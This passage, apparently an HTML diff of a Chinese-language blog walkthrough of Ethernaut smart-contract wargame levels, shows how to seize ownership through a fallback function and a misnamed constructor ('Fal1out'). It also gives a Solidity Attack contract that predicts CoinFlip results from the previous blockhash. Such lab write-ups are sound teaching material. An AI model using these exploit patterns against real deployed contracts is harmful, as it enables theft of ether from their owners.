@@ -34,5 +34,96 @@
 		<p>第一步调用contract.contribute({value:1})向合约发送1wei</p>
 		<p>第二步调用contract.sendTransaction({value:1})向合约发送1wei,或直接使用钱包向合约转账,成为owner</p>
 		<p>第三步调用contract.withedraw()即可清空合约ether,游戏结束</p>
+		<br><br>
+		<br><br>
+		<br><br>
+		<h3>3.Fallout</h3>
+		<p>题目要求:获取合约所有权</p>
+		<p>题目合约:</p>
+		<img src="https://yexingyu123456.github.io/photograph/ethernaut3.png">
+		<p>观察合约内容:</p>
+		<p>function Fallout 为与合约同名的构造函数,在部署合约时调用1次,但此处为function fal1out 可以直接调用</p>
+		<p>第一步调用contract.Fal1out   结束游戏</p>
+		<br><br>
+		<br><br>
+		<br><br>
+		<h3>4.Coin Flip</h3>
+		<p>题目要求:</p>
+		<p>连续猜中十次</p>
+		<p>题目合约:</p>
+		<img src="https://yexingyu123456.github.io/photograph/Ethernaut4.png">
+		<br><br>
+		<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html">查看solidity文档</a>
+		
+		<p>blockhash(uint blockNumber) returns (bytes32)：指定区块的区块哈希 —— 仅可用于最新的 256 个</p>
+		<p>根据合约,需要根据block.number(当前区块号)进行预测</p>
+		<P>由    if (lastHash == blockValue) {</P>
+			<p>revert();</p>
+		  <p>}中的内容可知,同一个区块不可以调用两次Flip()</p>
+		  <p>根据题目的计算方法,先将结果计算出来再调用flip()函数</p>
+		<p>编写如下攻击合约</p>
+	<textarea cols="140" rows="12">
+			contract Attack {
+				uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+				function attack(address _Flip) public returns (bool) {
+					CoinFlip coinflip = CoinFlip(_Flip);
+					uint256 blockValue = uint256(blockhash(block.number - 1));
+					uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+					bool side = coinFlip == 1 ? true : false;
+					coinflip.flip(side);
+					return side;
+				} 
+			}
+			
+		</textarea>
+		<p>放入题目合约中</p>
+		<pre><code>
+			// SPDX-License-Identifier: MIT
+			pragma solidity ^0.8.0;
+			
+			contract CoinFlip {
+			
+			  uint256 public consecutiveWins;
+			  uint256 lastHash;
+			  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+			
+			  constructor() {
+				consecutiveWins = 0;
+			  }
+			
+			  function flip(bool _guess) public returns (bool) {
+				uint256 blockValue = uint256(blockhash(block.number - 1));
+			
+				if (lastHash == blockValue) {
+				  revert();
+				}
+			
+				lastHash = blockValue;
+				uint256 coinFlip = blockValue / FACTOR;
+				bool side = coinFlip == 1 ? true : false;
+			
+				if (side == _guess) {
+				  consecutiveWins++;
+				  return true;
+				} else {
+				  consecutiveWins = 0;
+				  return false;
+				}
+			  }
+			}
+			contract Attack {
+				uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+				function attack(address _Flip) public returns (bool) {
+					CoinFlip coinflip = CoinFlip(_Flip);
+					uint256 blockValue = uint256(blockhash(block.number - 1));
+					uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+					bool side = coinFlip == 1 ? true : false;
+					coinflip.flip(side);
+					return side;
+				} 
+			}
+					
+		</code></pre>
+		<p>在remix使用injected web3环境部署合约,然后填入被攻击合约的地址即可。调用10次attack(被攻击合约的地址),直到consecutiveWins为10,结束游戏</p>
   </body>
 </html>
